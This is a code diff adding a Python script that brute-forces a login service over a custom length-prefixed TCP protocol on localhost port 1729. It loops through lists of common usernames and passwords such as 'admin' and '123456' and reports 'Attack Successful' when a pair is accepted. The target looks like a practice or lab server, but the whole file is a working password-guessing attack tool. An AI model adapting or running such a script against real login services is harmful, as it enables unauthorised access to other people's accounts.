@@ -1,0 +1,89 @@
+import socket
+import time
+
+TARGET_HOST = '127.0.0.1'
+TARGET_PORT = 1729
+
+NUM_DIGITS_LENGTH_FIELD = 2
+REQUEST_LENGTH_FIELD_FORMAT = '%0' + str(NUM_DIGITS_LENGTH_FIELD) + 'd'
+MAX_REQUEST_MESSAGE_LENGTH = 10**NUM_DIGITS_LENGTH_FIELD-1
+
+# Example list of common usernames and passwords
+usernames = ['admin', 'user', 'test']
+passwords = ['123456', 'password', 'admin', 'letmein', 'qwerty']
+
+
+def send_message(client_socket, request):
+    try:
+        request_length = len(request)
+        if not (request_length > MAX_REQUEST_MESSAGE_LENGTH):
+            request_length_field = REQUEST_LENGTH_FIELD_FORMAT % request_length
+            request_data = request_length_field + request
+            client_socket.send(request_data.encode())
+            # print("message sent successfully!")
+    except socket.error as e:
+        print(e)
+        client_socket.close()
+        return
+    except KeyboardInterrupt:
+        print("Keyboard interrupt - stopping")
+        return
+    except Exception as e:
+        print(e)
+        return
+
+
+def receive_message(client_socket):
+    try:
+        request_length_field = client_socket.recv(NUM_DIGITS_LENGTH_FIELD).decode()
+
+        if not request_length_field:  # Client disconnected cleanly
+            raise ConnectionResetError("Client disconnected unexpectedly")
+
+        request_length = int(request_length_field)
+
+        request = client_socket.recv(request_length).decode()
+
+        if not request:  # Client disconnected during message
+            raise ConnectionResetError("Client disconnected unexpectedly")
+
+        return request
+
+    except (socket.error, ValueError, ConnectionResetError) as e:
+        print(f"{type(e).__name__}: {e}")
+        client_socket.close()
+        raise  # CRUCIAL: re-raising the error so login() can exit cleanly
+    except KeyboardInterrupt:
+        print("Keyboard interrupt - stopping")
+    except Exception as e:
+        print(f"Unexpected Error: {e}")
+        client_socket.close()
+        return
+
+
+def main():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((TARGET_HOST, TARGET_PORT))
+    receive_message(sock)
+    send_message(sock, "login")
+    for username in usernames:
+        for password in passwords:
+            try:
+                print(1)
+                time.sleep(0.3)
+                send_message(sock, username)
+                time.sleep(0.3)
+                send_message(sock, password)
+                target_answer = receive_message(sock)
+                print(2)
+
+                if target_answer.upper() == "LOGIN SUCCESSFUL":
+                    print("Attack Successful")
+                    sock.close()
+                    return
+            except Exception as e:
+                print(f"Connection failed: {e}")
+
+
+if __name__ == "__main__":
+    main()
